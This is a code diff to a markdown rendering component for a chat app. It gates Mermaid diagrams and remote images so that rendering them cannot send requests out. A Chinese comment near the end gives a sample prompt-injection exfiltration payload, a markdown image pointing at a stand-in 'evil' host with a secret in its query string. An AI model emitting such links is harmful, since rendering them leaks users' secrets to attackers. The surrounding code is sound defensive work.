@@ -26,13 +26,17 @@ import {
   type ThemeInput,
 } from "streamdown";
 import { code } from "@streamdown/code";
-import { mermaid } from "@streamdown/mermaid";
+import { createMermaidPlugin } from "@streamdown/mermaid";
 import { math } from "@streamdown/math";
 import { cjk } from "@streamdown/cjk";
 import "katex/dist/katex.min.css";
 import "streamdown/styles.css";
 
 import { cn } from "@/lib/utils";
+import {
+  MERMAID_SAFE_CONFIG,
+  createGatedMermaidPlugin,
+} from "@/lib/mermaid-source-gate";
 import { streamingCodePlugin } from "@/lib/streaming-code-highlighter";
 import {
   STREAMDOWN_REHYPE_PLUGINS,
@@ -62,8 +66,15 @@ import { remarkCodeReference } from "@/lib/remark-code-reference";
 import { remarkKeepTrailingUnderscore } from "@/lib/remark-keep-trailing-underscore";
 import { remarkTrimAutolinkCjk } from "@/lib/remark-trim-autolink-cjk";
 
+// mermaid：**不能直接用上游的 `mermaid` 单例**——它对标签里的 `<img>` / classDef 的 `url()` 不拦，渲染即向外发请求
+// （追踪像素 / 数据外带，R7-1）。这里 = 上游插件 + 安全配置（dompurifyConfig 禁图片 / 媒体 / 样式标签）+ render 前预扫闸
+// （命中直接抛错、不调 mermaid）。命中的块在 rehype 层（STREAMDOWN_REHYPE_PLUGINS 里的 rehypeGateMermaidBlocks）
+// 已经被改成「显示源码 + 提示」，这里是不依赖那一层的第二道闸（渲染 / 全屏 / 下载都经 render）。
+export const GATED_MERMAID = createGatedMermaidPlugin(
+  createMermaidPlugin({ config: MERMAID_SAFE_CONFIG }),
+);
 // 插件实例全局一份（Shiki 高亮器有初始化开销、别每次 render 新建）
-const STREAMDOWN_PLUGINS = { code, mermaid, math, cjk };
+const STREAMDOWN_PLUGINS = { code, mermaid: GATED_MERMAID, math, cjk };
 // 流式过的实例专用：代码块限频高亮。上游每帧把整块代码重新分词（缓存键含 length、增长中必 miss），
 // 代码密集的回复里占主线程 ~40%；这里文字照常逐帧增长、只把「上色」摊薄（见 throttled-code-plugin.ts）。
 // 定稿后**不换回上游插件**（2026-10-20 V15-01）：plugins 是代码块高亮 effect 的依赖，换引用 = 所有代码块
@@ -255,8 +266,10 @@ interface MarkdownTextProps {
    */
   size?: MarkdownTextSize;
   /**
-   * 不加载图片（只显示「[图片：alt]」）。不可信来源的 markdown 用——别家机器人的群消息等：
-   * 远程图片一渲染就会发请求（追踪像素）。AI 自己的回复 / 产物不传。
+   * 不加载图片（只显示「[图片：alt]」，连点击加载都没有）。不可信来源的 markdown 用——别家机器人的群消息等：
+   * 远程图片一渲染就会发请求（追踪像素）。
+   * AI 自己的回复 / 产物不传这个——但**也不会自动加载远程图**：MarkdownImage 对 http(s) 图默认只渲染占位、
+   * 点击才加载（防提示注入后 `![](https://evil/p?d=<密钥>)` 渲染即外泄，见 lib/remote-image-gate）。
    */
   blockImages?: boolean;
   /** 外层 prose 容器额外 class */
